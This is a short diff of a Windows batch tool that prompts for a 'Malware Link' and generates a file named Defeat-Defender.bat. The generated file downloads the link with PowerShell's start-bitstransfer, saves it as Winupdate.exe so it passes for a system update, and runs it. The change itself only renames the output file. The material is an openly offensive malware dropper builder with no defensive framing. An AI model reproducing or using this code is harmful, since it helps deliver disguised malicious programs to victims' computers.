@@ -7,9 +7,9 @@ set /p a="Enter Malware Link: "
 if [%a%]==[] (goto error ) else (goto main)
 :main
 echo  Your  Url is :  %a% 
-echo. >>defeat.bat
+echo. >>Defeat-Defender.bat
 echo powershell -command "start-bitstransfer %a%   .\Winupdate.exe" >>Defeat-Defender.bat
-echo. >>defeat.bat
+echo. >>Defeat-Defender.bat
 echo start  Winupdate.exe >>Defeat-Defender.bat
 echo. >>Defeat-Defender.bat
 echo. >>Defeat-Defender.bat
